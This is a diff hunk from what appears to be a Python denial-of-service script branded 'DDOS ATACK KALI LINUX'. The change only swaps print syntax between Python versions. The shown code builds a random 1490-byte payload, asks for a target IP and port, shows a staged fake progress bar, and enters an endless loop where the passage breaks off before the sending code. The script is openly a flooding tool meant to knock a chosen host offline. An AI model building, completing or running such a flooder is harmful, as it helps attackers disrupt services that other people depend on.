@@ -19,35 +19,35 @@ bytes = random._urandom(1490)
 
 os.system("clear")
 os.system("figlet DDOS ATACK KALI LINUX")
-print ("           ") 
-print ("Autor    : Evan01")
-print ("You Tube : https://www.youtube.com/channel/UCkpaIqn_gz4xIT9PkASiRdg")
-print ("github   : https://github.com/bythelink89/")
+print "           " 
+print "Autor    : Evan01"
+print "You Tube : https://www.youtube.com/channel/UCkpaIqn_gz4xIT9PkASiRdg"
+print "github   : https://github.com/bythelink89/"
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
 os.system("clear")
 os.system("figlet INICIANDO ATAQUE ")
-print ("[                    ] 0% ")
+print "[                    ] 0% "
 time.sleep(5)
-print ("[===                 ] 14%")
+print "[===                 ] 14%"
 time.sleep(5)
-print ("[=====               ] 25%")
+print "[=====               ] 25%"
 time.sleep(5)
-print ("[==========          ] 50%")
+print "[==========          ] 50%"
 time.sleep(5)
-print ("[============        ] 68%")
+print "[============        ] 68%"
 time.sleep(2)
-print ("[===============     ] 75%")
+print "[===============     ] 75%"
 time.sleep(5)
-print ("[==================  ] 92%")
+print "[==================  ] 92%"
 time.sleep(2)
-print ("[====================] 100%")
+print "[====================] 100%"
 time.sleep(3)
-print ("LAUNCHING DDOS-ATACK-KALI-")
+print "LAUNCHING DDOS-ATACK-KALI-"
 time.sleep(3)
-print ("Please wait")
+print "Please wait"
 time.sleep(14)
 sent = 0
 while True:
